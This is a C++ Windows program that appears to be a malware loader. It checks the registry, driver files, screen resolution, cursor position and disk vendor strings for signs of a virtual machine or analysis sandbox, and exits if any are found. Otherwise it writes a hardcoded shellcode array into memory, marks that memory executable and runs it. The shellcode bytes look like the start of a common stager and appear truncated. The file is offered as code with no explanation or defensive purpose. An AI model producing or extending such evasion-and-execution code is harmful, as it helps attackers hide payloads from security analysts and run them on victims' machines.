#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

bool IsVirtualMachine() {
    const std::vector<std::pair<HKEY, std::wstring>> registryChecks = {
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"},
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\Description\\System"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\SystemInformation"},
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VBOX__"},
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\FADT\\VBOX__"},
        {HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\RSDT\\VBOX__"},
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Oracle\\VirtualBox Guest Additions"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxGuest"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxMouse"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxService"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxSF"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxVideo"},
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\VMware, Inc.\\VMware Tools"},
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wine"},
        {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Enum\\IDE"},
        {HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Enum\\SCSI"}
    };

    for (const auto& regCheck : registryChecks) {
        HKEY hKey;
        if (RegOpenKeyExW(regCheck.first, regCheck.second.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }

    const std::vector<std::wstring> fileChecks = {
        L"system32\\drivers\\VBoxMouse.sys",
        L"system32\\drivers\\VBoxGuest.sys",
        L"system32\\drivers\\VBoxSF.sys",
        L"system32\\drivers\\VBoxVideo.sys",
        L"system32\\vboxdisp.dll",
        L"system32\\vboxhook.dll",
        L"system32\\vboxmrxnp.dll",
        L"system32\\vboxogl.dll",
        L"system32\\vboxoglarrayspu.dll",
        L"system32\\vboxoglcrutil.dll",
        L"system32\\vboxoglerrorspu.dll",
        L"system32\\vboxoglfeedbackspu.dll",
        L"system32\\vboxoglpackspu.dll",
        L"system32\\vboxoglpassthroughspu.dll",
        L"system32\\vboxservice.exe",
        L"system32\\vboxtray.exe",
        L"system32\\VBoxControl.exe",
        L"system32\\drivers\\vmmouse.sys",
        L"system32\\drivers\\vmhgfs.sys",
        L"system32\\drivers\\vm3dmp.sys",
        L"system32\\drivers\\vmci.sys",
        L"system32\\drivers\\vmhgfs.sys",
        L"system32\\drivers\\vmmemctl.sys",
        L"system32\\drivers\\vmmouse.sys",
        L"system32\\drivers\\vmrawdsk.sys",
        L"system32\\drivers\\vmusbmouse.sys"
    };

    for (const auto& fileCheck : fileChecks) {
        if (GetFileAttributesW(fileCheck.c_str()) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
    }

    return false;
}

bool IsSandboxByResolution() {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    const int sandboxResolutions[][2] = {
        {1024, 768},
        {800, 600},
        {640, 480}
    };

    for (const auto& resolution : sandboxResolutions) {
        if (screenWidth == resolution[0] && screenHeight == resolution[1]) {
            return true;
        }
    }

    return false;
}

bool IsSandboxByMouseMovement() {
    POINT pt;
    GetCursorPos(&pt);
    if (pt.x == 0 && pt.y == 0) {
        return true;
    }
    return false;
}

bool IsVirtualDisk() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open device." << std::endl;
        return false;
    }

    STORAGE_PROPERTY_QUERY storagePropertyQuery;
    DWORD bytesReturned;
    char buffer[10000];

    memset(&storagePropertyQuery, 0, sizeof(STORAGE_PROPERTY_QUERY));
    storagePropertyQuery.PropertyId = StorageDeviceProperty;
    storagePropertyQuery.QueryType = PropertyStandardQuery;

    if (DeviceIoControl(hDevice, IOCTL_STORAGE_QUERY_PROPERTY, &storagePropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
        &buffer, sizeof(buffer), &bytesReturned, NULL)) {
        STORAGE_DEVICE_DESCRIPTOR* deviceDescriptor = (STORAGE_DEVICE_DESCRIPTOR*)buffer;
        char vendorId[256] = { 0 };
        char productId[256] = { 0 };

        if (deviceDescriptor->VendorIdOffset != 0) {
            strcpy_s(vendorId, sizeof(vendorId), buffer + deviceDescriptor->VendorIdOffset);
        }
        if (deviceDescriptor->ProductIdOffset != 0) {
            strcpy_s(productId, sizeof(productId), buffer + deviceDescriptor->ProductIdOffset);
        }

        std::cout << "Vendor ID: " << vendorId << std::endl;
        std::cout << "Product ID: " << productId << std::endl;

        if (strstr(vendorId, "VMware") || strstr(vendorId, "VBOX") || strstr(productId, "Virtual")) {
            CloseHandle(hDevice);
            return true;
        }
    }
    else {
        std::cerr << "DeviceIoControl failed." << std::endl;
        CloseHandle(hDevice);
        return false;
    }

    CloseHandle(hDevice);
    return false;
}

int main() {
    if (IsVirtualMachine()) {
        std::cout << "Running in a virtual machine environment.\n";
        return 1;
    }

    if (IsSandboxByResolution()) {
        std::cout << "Running in a sandbox environment (resolution check).\n";
        return 1;
    }

    if (IsSandboxByMouseMovement()) {
        std::cout << "Running in a sandbox environment (mouse movement check).\n";
        return 1;
    }

    if (IsVirtualDisk()) {
        std::cout << "Running in a virtual environment (HDD check).\n";
        return 1;
    }

    unsigned char shellcode[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac";

    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);

    memcpy(exec, shellcode, sizeof(shellcode));

    DWORD oldProtect;
    VirtualProtect(exec, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);

    void(*func)();
    func = (void(*)())exec;
    func();

    VirtualFree(exec, 0, MEM_RELEASE);
    return 0;
}
